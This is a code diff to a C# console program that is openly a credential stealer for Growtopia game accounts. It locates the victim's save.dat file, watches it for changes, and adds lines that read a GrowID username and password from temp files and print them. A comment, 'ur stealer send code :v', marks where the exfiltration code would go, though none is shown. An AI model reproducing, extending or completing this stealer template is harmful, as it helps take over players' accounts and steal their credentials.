@@ -16,9 +16,14 @@ namespace ConsoleApp4
         public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
         public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
         public static void SendSaveDat()
-        {
-            Console.Write("Send Success\n");
 
+        {
+            #region ReadGrowIDPass
+            string username = File.ReadAllText(Path.GetTempPath() + "\\user.txt");
+            string password = File.ReadAllText(Path.GetTempPath() + "\\pass.txt");
+            #endregion
+            Console.Write("------------------------\n| Send Success         |\n");
+            Console.WriteLine("------------------------\n| GrowID: " + username + "\n| Password: " + password + "\n------------------------\n");
             //ur stealer send code :v
         }
         static void Main(string[] args)
